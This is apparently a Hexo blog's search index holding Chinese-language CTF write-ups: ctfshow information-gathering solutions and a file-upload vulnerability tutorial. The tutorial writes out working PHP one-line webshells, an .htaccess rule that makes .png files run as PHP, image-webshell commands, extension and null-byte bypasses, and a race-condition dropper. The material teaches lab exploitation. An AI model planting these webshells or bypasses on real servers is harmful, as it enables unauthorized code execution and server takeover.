<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ctfshow信息搜集</title>
    <url>/2025/072230057.html</url>
    <content><![CDATA[<h1 id="ctfshow信息搜集"><a href="#ctfshow信息搜集" class="headerlink" title="ctfshow信息搜集"></a>ctfshow信息搜集</h1><h2 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h2><p>源代码泄露</p>
<h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><p>无法查看源代码，有两种方法，一种是直接<strong>ctrl+U</strong>,另一种是在url前加上**<a href="https://ctf.show/writeups/946329">view-source: </a>**</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">view-source:https://25b672e8-95f7-4258-8246-e2fae04f135f.challenge.ctf.show/</span><br></pre></td></tr></table></figure>

<h2 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h2><p>直接抓包</p>
<span id="more"></span>

<p>或者f12在网络里找</p>
<img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202507210915357.png" alt="image-20250721091511285" style="zoom:67%;" />

<h2 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">总有人把后台地址写入robots，帮黑阔大佬们引路。</span><br></pre></td></tr></table></figure>

<p><a href="https://ctf.show/writeups/1227638">robots.txt 一个非常重要得到文件，通常情况下，主要用于指定搜索引擎蜘蛛spider在网站里的抓取范围,用于声明蜘蛛不可以抓取哪些网站资源及可以抓取哪些网站资源。</a></p>
<h2 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h2><p>提示phps源码泄露</p>
<p>.phps导致源码泄露<br>phps文件就是php的源代码文件，通常用于提供给用户（访问者）直接通过Web浏览器查看php代码的内容。<br>因为用户无法直接通过Web浏览器“看到”php文件的内容，所以需要用phps文件代替。<br>并不是所有的php文件都存在.phps后缀，不是默认带有，只会在特殊情况下存在<br>详情见百度<br>解：<br>利用目录扫描工具，例如御剑，扫描出靶场目录下有个index.php（一般可以猜出来），将index.php改为index.phps访问，自动下载了index.php的源码，打开获取flag</p>
<h2 id="Web6"><a href="#Web6" class="headerlink" title="Web6"></a>Web6</h2><p>提示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">解压源码到当前目录，测试正常，收工</span><br></pre></td></tr></table></figure>

<p>[用<a href="http://www.zip下载压缩包]即可。[url/www.zip]">www.zip下载压缩包]即可。[url/www.zip]</a></p>
<h2 id="Web7"><a href="#Web7" class="headerlink" title="Web7"></a>Web7</h2><p>dirsearch扫描一下，发现.git，直接访问</p>
<h2 id="Web8"><a href="#Web8" class="headerlink" title="Web8"></a>Web8</h2><p>同第七题，发现[.svn]，直接访问</p>
<h2 id="Web9"><a href="#Web9" class="headerlink" title="Web9"></a>Web9</h2><p>vim编辑器使用时会有一个缓存文件，这个缓存文件在保存时进行删除，但是在vim意外退出时这个缓存文件，会以源文件加一个.swp后缀进行保存，我们可以尝试访问这些文件来尝试获取一些文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url/index.php.swp</span><br></pre></td></tr></table></figure>

<h2 id="Web10"><a href="#Web10" class="headerlink" title="Web10"></a>Web10</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cookie 只是一块饼干，不能存放任何隐私数据</span><br></pre></td></tr></table></figure>

<p>抓包或者f12查看网络请求头</p>
<h2 id="Web11"><a href="#Web11" class="headerlink" title="Web11"></a>Web11</h2><p>查询DNS信息</p>
<p><a href="https://zijian.aliyun.com/">https://zijian.aliyun.com/</a></p>
<p><a href="http://dbcha.com/">http://dbcha.com/</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup -qt=txt flag.ctfshow.com</span><br></pre></td></tr></table></figure>

<h2 id="Web12"><a href="#Web12" class="headerlink" title="Web12"></a>Web12</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">有时候网站上的公开信息，就是管理员常用密码</span><br></pre></td></tr></table></figure>

<p>进去看到一个网页，用robots.txt或者dirsearch可以发现后台网站&#x2F;admin&#x2F;，根据提示猜测网页最下端的number[372619038为密码，登录成功。</p>
<h2 id="Web13"><a href="#Web13" class="headerlink" title="Web13"></a>Web13</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</span><br></pre></td></tr></table></figure>

<p>在网页最下边随便点点进入技术文档，可以发现</p>
<img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202507221751939.png" alt="image-20250722175144875" style="zoom:67%;" />

<p>直接在url后边加上system1103&#x2F;login.php，登入后台，拿到flag</p>
<h2 id="Web14"><a href="#Web14" class="headerlink" title="Web14"></a>Web14</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</span><br></pre></td></tr></table></figure>

<p>根据提示，先输入 当前路径加&#x2F;editor 发现是一个编辑器，在编辑 器中，找到插入文件。 发现插入的文件 ，在文件空间中找文件插入，发现 居然是服务器中的文件（非本地），于是浏览一下目录 在var&#x2F;www&#x2F;html目录 中，存在 一个nothinghere有一个文件 fl000g.txt 直接访问这个fl000g.txt 即可获得flag!</p>
<h2 id="Web15"><a href="#Web15" class="headerlink" title="Web15"></a>Web15</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">公开的信息比如邮箱，可能造成信息泄露，产生严重后果</span><br></pre></td></tr></table></figure>

<p>首先，在网页最下方发现一个邮箱，于是就去QQ上搜索了一下QQ号，只是发现了一个账号，地点是陕西西安，就没有发现其它有用的信息。 然后回到网页扫目录发现有一个admin，去访问发现是个后台，点击忘记密码，发现让我输入地点，那么就西安啦。 得到一个新密码，发现其中自带admin，账号估计就是admin了。 尝试一下果真如此。</p>
<h2 id="Web16"><a href="#Web16" class="headerlink" title="Web16"></a>Web16</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</span><br></pre></td></tr></table></figure>

<p>php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡流量、系统负载、服务器时间等信息</p>
<ul>
<li>根据提示用到php探针知识点</li>
<li>输入默认探针url&#x2F;tz.php</li>
<li>打开后点击phpinfo就可以查看到flag</li>
</ul>
<h2 id="Web17"><a href="#Web17" class="headerlink" title="Web17"></a>Web17</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">备份的sql文件会泄露敏感信息</span><br></pre></td></tr></table></figure>

<p>dirsearch扫描有个backup.sql</p>
<p>访问url&#x2F;backup.sql，自动下载了backup.sql<br>打开backup.sql，即可获取flag</p>
<h2 id="Web18"><a href="#Web18" class="headerlink" title="Web18"></a>Web18</h2><p>进入游戏后查看源码，发现一段js代码，点击访问 发现了一段编码，需要进行 unicode 解码：u4f60u8d62u4e86uff0cu53bbu5e7au5e7au96f6u70b9u76aeu7231u5403u76aeu770bu770b,解码后得到110.php的文件名 访问得到flag</p>
<p>这是一个javascript 的游戏，游戏的目的就是让要赢，从js代码中可知，当score&gt;120时，且game_over这个参数为false时，即可赢，于是打开开发者模式中的console，直接赋值score&#x3D;130 game_over&#x3D;false 然后，执行游戏 的run() 即可得到 “你赢了，去幺幺零点皮爱吃皮看看”， 即，110.php 打开它，即得flag</p>
<img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202507222241337.png" alt="image-20250722224137261" style="zoom:67%;" />

<img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202507222242023.png" alt="image-20250722224202954" style="zoom:67%;" />

<h2 id="Web19"><a href="#Web19" class="headerlink" title="Web19"></a>Web19</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密钥什么的，就不要放在前端了</span><br></pre></td></tr></table></figure>

<p>查看源码，发现是aes解密</p>
<img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202507222302592.png" alt="image-20250722230202529" style="zoom:67%;" />

<h2 id="Web20"><a href="#Web20" class="headerlink" title="Web20"></a>Web20</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</span><br></pre></td></tr></table></figure>

<p>dirsearch递归扫描<br>使用dirsearch的-r参数递归扫描，扫描出url&#x2F;db&#x2F;db.mdb<br>访问url&#x2F;db&#x2F;db.mdb，自动下载db.mdb，打开后全局搜索flag即可获取flag</p>
<img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202507222311778.png" alt="image-20250722231130725" style="zoom:67%;" />]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>指纹识别</title>
    <url>/2024/062221050.html</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2024/062116108.html</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<span id="more"></span>

<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>文件上传</title>
    <url>/2024/082211796.html</url>
    <content><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&#x27;whoami&#x27;);?&gt;</span><br><span class="line">&lt;?php eval(&#x27;code_str&#x27;);?&gt;        #php代码块 system(&#x27;whoami&#x27;)</span><br><span class="line">&lt;?php system(&#x27;command&#x27;)?&gt;        #直接传命令就行，whoami</span><br><span class="line">&lt;?php assert(&#x27;assertion&#x27;)?&gt;      #断延，也可以理解为代码块，只适用于php5以下，php7需要用eval</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>eg：</p>
<?php eval($_GET[1]);?>

<p>?1&#x3D;system(whoami);                #注意结尾带分号，非则不识别</p>
<p>&#x3D;<?php eval(system(whoami););?></p>
<p>蚁剑用的是eval木马</p>
<h2 id="1-JavaScript-绕过"><a href="#1-JavaScript-绕过" class="headerlink" title="[1-JavaScript 绕过]"></a><strong>[1-JavaScript 绕过]</strong></h2><p>经过测试发现靶场只能传图片，一句话木马传不上去。对于JS一共有三种方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.禁用JS</span><br><span class="line">2.bp改包</span><br><span class="line">3.js调试</span><br><span class="line">4.使用BP修改返回包（拓展）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system($_REQUEST[1]) ?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="1-禁用JS"><a href="#1-禁用JS" class="headerlink" title="1.禁用JS"></a>1.禁用JS</h3><p>右键检查，找到设置，找到禁用JS，关掉</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408151107765.png" alt="image-20240815110753677"></p>
<p>这个时候前端验证就无法检查我们上传的是不是图片了，再次上传一句话木马shell.php，然后蚁剑连接或者直接输</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url/shell.php?1=cat /flag</span><br></pre></td></tr></table></figure>

<h3 id="2-bp改包"><a href="#2-bp改包" class="headerlink" title="2.bp改包"></a>2.bp改包</h3><p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408151111331.png" alt="image-20240815111131288"></p>
<p>相当于在bp中狸猫换太子，绕过浏览器检测并给服务器传一句话木马。</p>
<p>首先将shell.php改为shell.png上传，用bp抓包，</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408151118472.png" alt="image-20240815111802445"></p>
<p>将filename的png改为php,在发送即可，此时木马上传成功，</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408151122494.png" alt="image-20240815112204461"></p>
<h3 id="3-js调试"><a href="#3-js调试" class="headerlink" title="3.js调试"></a>3.js调试</h3><p>右键，检查然后找到调试器，空白index，刷新以下出现内容，在第40行下一个断点（whitelist后边，报错之前），目的是在报错之前可以修改验证</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408151131628.png" alt="image-20240815113134589"></p>
<p>之后上传shell.php，可以看到浏览器暂停了</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408151132335.png" alt="image-20240815113247270"></p>
<p>此时有两种方法可以调试js，一种是直接修改whitelist内容，改为php</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408151138335.png" alt="image-20240815113815280"></p>
<p>修改成功后把断点释放掉，即可上传成功。</p>
<p>这种用谷歌进行，火狐修改不了。</p>
<p>第二种是用控制台进行调试，同样下一个断点（弹窗前）</p>
<p>上传shell.php,卡住之后来到控制台，输入whitelist，会返回白名单</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408151145998.png" alt="image-20240815114514939"></p>
<p>之后自己加一个php后缀，告诉他php也是合法的</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408151149819.png" alt="image-20240815114936786"></p>
<p>之后释放掉断点，即可成功上传。</p>
<h3 id="拓展："><a href="#拓展：" class="headerlink" title="拓展："></a>拓展：</h3><p>一：</p>
<p>不使用debug调试的时候，如何局部修改JS</p>
<h4 id="使用BP修改返回包内容"><a href="#使用BP修改返回包内容" class="headerlink" title="使用BP修改返回包内容"></a>使用BP修改返回包内容</h4><p>一.不上传木马，直接刷新页面用BP抓包，之后拦截响应包</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408151229088.png" alt="image-20240815122912019"></p>
<p>再点击发送，即可返回源码，在BP中直接修改加上php即可</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408151230424.png" alt="image-20240815123052385"></p>
<p>这种只适用于简单的网站。</p>
<p>另一种方法是网站JS不是直接写在源码中的，而是引用的外部JS</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408151232903.png" alt="image-20240815123243863"></p>
<p>如何用BP拦截这种JS？</p>
<p>直接拦截是拦截不住的，需要勾选。</p>
<p>找到Options,再找到File extention（默认不拦截的）,修改，去掉JS，此时就可以拦截外部JS了</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408151238156.png" alt="image-20240815123838093"></p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408151238128.png" alt="image-20240815123857080"></p>
<p>把JS删掉，之后再次拦截，即可然后按照上边的步骤用拦截执行，拦截响应包，这个时候就可以随便修改外部JS了，可以用来修改JS小游戏的分数。</p>
<h2 id="2-自定义解析规则"><a href="#2-自定义解析规则" class="headerlink" title="[2-自定义解析规则]"></a><strong>[2-自定义解析规则]</strong></h2><p>htaccess 文件是 Apache 服务器中的一个配置文件，它负责相关目录下的网页配置。通过 htaccess 文件，可以帮我们实现：网页301重定向、自定义 404 错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p>
<p>查看源码，发现靶场没有过滤.htaccess</p>
<p>准备⼀个解析规则： </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat .htaccess</span><br><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure>

<p>这段代码的意思是添加一种类型，用png为后缀，当作<strong>application&#x2F;x-httpd-php</strong>来使用。这表示将 upload ⽬录下的所有 png 图⽚都当做 php 来解析，</p>
<p>由下图可以看出apache服务器中的对应规则，这句是为什么能解析。</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408151611815.png" alt="image-20240815161133740"></p>
<p>创建一个.htaccess文件，直接命名为.开头就行，直接上传，然后再上传⼀个 shell.png 的 webshell 即可：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_REQUEST[1]); ?&gt;</span><br></pre></td></tr></table></figure>

<p>蚁剑连接即可。</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408151642722.png" alt="image-20240815164208627"></p>
<p>ggctf{65ea8214bf2f6f83de9a159883d9ec5d}</p>
<h2 id="3-MIME-绕过"><a href="#3-MIME-绕过" class="headerlink" title="[3-MIME 绕过]"></a><strong>[3-MIME 绕过]</strong></h2><p><strong>媒体类型</strong>（通常称为 <strong>Multipurpose Internet Mail Extensions</strong> 或 <strong>MIME</strong> 类型 ）是一种标准，用来表示文档、文件或字节流的性质和格式。</p>
<p>MIME的组成结构非常简单；由类型与子类型两个字符串中间用 ‘&#x2F;‘ 分隔而组成。不允许空格存在。type 表示可以被分多个子类的独立类别。subtype 表示细分后的每个类型。</p>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types">常见 MIME 类型列表 - HTTP | MDN (mozilla.org)</a></p>
<p>先看一下靶场源码</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408152101225.png" alt="image-20240815210101156"></p>
<p>检测是否有这四种类型，没有的话就会被拦截</p>
<p>上传一个shell.png，可以按到Content-Type: image&#x2F;png</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408152102173.png" alt="image-20240815210220143"></p>
<p>此时网页是不会报错的，但是单独传一个图片后缀是没有用的，此时有两种方法，一种是上传图片，BP拦截后把文件后缀改为.php此时</p>
<p>Content-Type: image&#x2F;png不变不会报错，可以成功。第二种是上传shell.php，然后修改Content-Type为image&#x2F;png即可。</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408152134710.png" alt="image-20240815213453677"></p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408152138732.png" alt="image-20240815213838704"></p>
<p>之后蚁剑连接即可。</p>
<h3 id="4-文件头绕过"><a href="#4-文件头绕过" class="headerlink" title="[4-文件头绕过]"></a><strong>[4-文件头绕过]</strong></h3><p>一个文件里面的内容到底是啥？用惯了Windows的人肯定是看后缀。但是后缀这个东西说改就改，不可靠。所以，最保险的还是把文件类型信息写到文件里面，通常来说，也就是写到文件开头的那几个字节。这是最方便，最快捷的用来辨别一个文件真实内容的方法。</p>
<p>常见的文件头标志如下：</p>
<p>JPEG (jpg)，文件头：<code>FFD8FF</code><br>PNG (png)，文件头：<code>89504E47</code><br>GIF (gif)，文件头：<code>47494638</code><br>HTML (html)，文件头：<code>68746D6C3E</code><br>ZIP Archive (zip)，文件头：<code>504B0304</code><br>RAR Archive (rar)，文件头：<code>52617221</code><br>Adobe Acrobat (pdf)，文件头：<code>255044462D312E</code><br>MS Word&#x2F;Excel (xls.or.doc)，文件头：<code>D0CF11E0</code></p>
<p>靶场会检测文件头的类型，先检查了MIME类型，再检查了文件头</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408221755491.png" alt="image-20240822175512434"></p>
<p>这个时候就需要改木马的文件头。</p>
<p>第一种方法在BP中改文件头，我自己试了一下没成功。可以看到一句话木马前不是png的文件头。</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408221806165.png" alt="image-20240822180621104"></p>
<p>第二种是生成图片马。</p>
<ul>
<li>windows下 图马制作</li>
</ul>
<p>先准备一个正常的A.png图片，在准备一个shell.php一句话木马，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy A.png/b + shell.php/a info.png     #先图片后木马</span><br></pre></td></tr></table></figure>

<p>此时就会生成一个info.png，上传这个，同时修改<strong>filename&#x3D;shell.php,MIME不变</strong>。</p>
<ul>
<li>Linux 下 图马制作</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash# 将 shell.php 内容追加到 pic.png</span><br><span class="line">cat shell.php &gt;&gt; pic.png</span><br><span class="line"></span><br><span class="line"># png + php 合成 png 图马</span><br><span class="line">cat pic.png shell.php &gt;&gt; shell.png</span><br><span class="line"></span><br><span class="line"># 直接 echo 追加</span><br><span class="line">echo &#x27;&lt;?php phpinfo();?&gt;&#x27; &gt;&gt; pic.png</span><br></pre></td></tr></table></figure>



<h3 id="5-嵌套绕过"><a href="#5-嵌套绕过" class="headerlink" title="[5-嵌套绕过]"></a><strong>[5-嵌套绕过]</strong></h3><p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408221832228.png" alt="image-20240822183202164"></p>
<p>这段代码的意思是首先确定一个黑名单，第二行如果匹配到了这些后缀就把这些后缀删掉，<strong>str_ireplace</strong>中的i表示不区分大小写，只要有黑名单的后缀就删掉后缀。</p>
<p>eg:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell.php  &gt;&gt;  shell.</span><br></pre></td></tr></table></figure>

<p>这个时候利用代码缺陷绕过，写另一种后缀</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell.pphphp</span><br></pre></td></tr></table></figure>

<p>这个时候检测的时候就会删除中间php,剩下一个php</p>
<h3 id="6-大小写绕过"><a href="#6-大小写绕过" class="headerlink" title="[6-大小写绕过]"></a><strong>[6-大小写绕过]</strong></h3><p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408221955018.png" alt="image-20240822195519974"></p>
<p>这里和第五个靶场的区别一个是没有i检测大小写，另一个就是两个引号中间不是没有东西了，而是替换成了空格，也就是说第五题的方法行不通了，php等会被替换为空格导致网站无法解析成功，所以就需要大小写绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell.PHP</span><br></pre></td></tr></table></figure>

<p>这种方法在windows中可行，因为他不区分大小写，但是linux不行，因为linux区分大小写。</p>
<h3 id="7-GET-型-00-截断"><a href="#7-GET-型-00-截断" class="headerlink" title="[7-GET 型 00 截断]"></a><strong>[7-GET 型 00 截断]</strong></h3><p>PHP内核是由C语言实现的，所以使用了C语言中的一些字符串处理函数。比如在连接字符串时候，0字节(\x00)将作为字符串结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串<br>这种方法只适用于</p>
<ul>
<li>magic -quotes-gpc&#x3D; Off</li>
<li>PHP版本小于5.3.4</li>
</ul>
<p>00截断常配合目录截断</p>
<p>上传一个info.png，BP抓包，在目录upload后边加上x.php%00。%00在url解码中会被转成空，就会截断。</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408222014987.png" alt="image-20240822201421913"></p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408222016626.png" alt="image-20240822201630559"></p>
<p>之后上传，此时这个图片会不存在，因为半路被截断下来了，此时实际上上传的是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...upload/x.php%00info.php</span><br><span class="line">url解码后</span><br><span class="line">...upload/x.php\x00info.php    #已知\x00为空，此时浏览器读到\x00后就不会往下读了，也就是说就等于上传上了x.php</span><br></pre></td></tr></table></figure>

<h3 id="8-POST-型-00-截断"><a href="#8-POST-型-00-截断" class="headerlink" title="[8-POST 型 00 截断]"></a><strong>[8-POST 型 00 截断]</strong></h3><p>跟第七个靶场很像，区别是这个是POST型截断也是上传info.png，BP抓包</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408222023765.png" alt="image-20240822202338693"></p>
<p>此时跟GET型一样写上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./upload/x.php</span><br></pre></td></tr></table></figure>

<p>但是直接这样放包的话会失败，因为windows 在GET的时候会自动进行解码，而POST不会自动解码，所以需要在BP中手动解码一下</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408222026691.png" alt="image-20240822202644625"></p>
<p>此时解码完%00就会成空字节，再上传即可。</p>
<p>第二种方法是BP抓包后手动修改16进制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./upload/x.php </span><br></pre></td></tr></table></figure>

<p>在x.php后加一个空格，而空格的16进制是20，在BP中手动修改为00即可。</p>
<h3 id="9-黑名单缺陷"><a href="#9-黑名单缺陷" class="headerlink" title="[9-黑名单缺陷]"></a><strong>[9-黑名单缺陷]</strong></h3><p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408222032747.png" alt="img"></p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408222031475.png" alt="image-20240822203151434"></p>
<p>源码中只过滤了四种，phtml&#x2F;pht都没过虑</p>
<p>所以后缀直接改成info.pht即可</p>
<h3 id="10-条件竞争上传"><a href="#10-条件竞争上传" class="headerlink" title="[10-条件竞争上传]"></a><strong>[10-条件竞争上传]</strong></h3><p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408222034696.png" alt="img"></p>
<p>条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序。当这些不受控制的事件并没有按照开发者想要的方式运行时，就可能会出现 bug。尤其在当前我们的系统中大量对资源进行共享，如果处理不当的话，就会产生条件竞争漏洞。</p>
<p>攻击者上传了一个用来生成恶意 shell 的文件，在上传完成和安全检查完成并删除它的间隙，攻击者通过不断地发起访问请求的方法访问了该文件，该文件就会被执行，并且在服务器上生成一个恶意 shell 的文件。至此，该文件的任务就已全部完成，至于后面发现它是一个不安全的文件并把它删除的问题都已经不重要了，因为攻击者已经成功的在服务器中植入了一个 shell 文件，后续的一切就都不是问题了。</p>
<p>不过竞争的马因为生存周期短的原因，所以和普通的 Webshell 不太一样，他的使命是在有限的生命中等待一个有缘人的光顾，然后快速生成一个小 Webshell，落红不是无情物，化作春泥更护花（泪目）。这类的 Webshell 内容大体上如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;xiao.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408222035580.png" alt="image-20240822203523472"></p>
<p>看一下源代码的逻辑，首先上传路径是upload，再是白名单和文件名。</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408222037834.png" alt="image-20240822203756748"></p>
<p>但是下面这部分出现了问题，第一步他是先用**move_uploaded_file函数将文件先请到UPLOAD_PATH,不管是不是白名单后缀，接着第二步他再检测是否是白名单，如果是即可通过，如果不是第三步unlike 删除文件。</p>
<p>这个时候会出现一个时间差，就是条件竞争，短时间内多线程大量请求（上传），这个时候就会有漏网之鱼，即CPU来不及清理到。</p>
<p>之前用到的一句话木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>

<p>这个时候可能就不适用了，因为他存活时间短，可能蚁剑刚连上就会断掉，这时候就会用到母马。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">母马 -&gt;解析 -&gt;释放子马</span><br></pre></td></tr></table></figure>

<ol>
<li>挑选天选之马（母马）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;xiao.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<p>表示当这个字符串被访问时，会将**<?php eval($_REQUEST[1]);?>**写入到xiao.php。</p>
<p>2.需要条件竞争，大量快速上传木马到服务器</p>
<p>3.母马需要被解析（访问）</p>
<p>如果上传成功，但是不访问，就不会触发解析，不解析就没有任何作用</p>
<p>4.访问母马释放出来的子马即可getshell</p>
